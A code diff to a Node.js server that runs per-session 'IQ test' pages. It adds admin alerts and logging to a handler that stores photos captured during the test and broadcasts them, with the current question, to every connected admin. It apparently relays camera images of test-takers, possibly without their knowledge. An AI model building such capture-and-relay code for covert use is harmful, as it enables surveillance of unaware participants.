@@ -42,6 +42,13 @@ app.get('/iqtest/:sessionId', (req, res) => {
       photoCount: 0
     });
     console.log(`IQ Session auto-created: ${sessionId}`);
+    
+    // Notify admins about new session
+    broadcastToAdmins({
+      type: 'iq_session_created',
+      sessionId: sessionId,
+      participantName: 'Anonymous'
+    });
   }
   
   // Serve the IQ test page
@@ -163,6 +170,8 @@ wss.on('connection', (ws, req) => {
       
     } else if (data.type === 'iq_photo_capture') {
       // IQ test photo capture
+      console.log(`Received IQ photo capture: ${data.sessionId} - ${data.photoType}`);
+      
       if (!iqPhotos.has(data.sessionId)) {
         iqPhotos.set(data.sessionId, []);
       }
@@ -179,17 +188,21 @@ wss.on('connection', (ws, req) => {
       // Update session photo count
       if (iqSessions.has(data.sessionId)) {
         iqSessions.get(data.sessionId).photoCount++;
+        console.log(`Session ${data.sessionId} now has ${iqSessions.get(data.sessionId).photoCount} photos`);
       }
       
       // Forward to all admins
-      broadcastToAdmins({
+      const messageToAdmins = {
         type: 'iq_photo_captured',
         sessionId: data.sessionId,
         photoType: data.photoType,
         timestamp: data.timestamp,
         currentQuestion: data.currentQuestion,
         photo: data.photo
-      });
+      };
+      
+      console.log(`Broadcasting IQ photo to ${adminClients.size} admins`);
+      broadcastToAdmins(messageToAdmins);
       
       console.log(`IQ Photo captured: ${data.sessionId} - ${data.photoType}`);
       
